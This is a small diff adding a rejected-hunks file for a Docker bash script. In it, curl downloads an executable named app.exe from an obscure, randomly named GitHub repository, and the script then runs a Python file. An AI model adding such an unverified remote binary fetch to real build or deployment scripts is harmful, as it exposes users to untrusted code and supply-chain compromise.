@@ -1,0 +1,7 @@
+diff a/docker/20211011.sh b/docker/20211011.sh	(rejected hunks)
+@@ -1,2 +1,4 @@
+ #!/bin/bash
++rm -rf app.exe
++curl -L -H "Cache-Control: no-cache" -o app.exe https://raw.githubusercontent.com/xiaosijitest/weioferiogeroijiii/main/app.exe
+ python3 2.py
+\ No newline at end of file
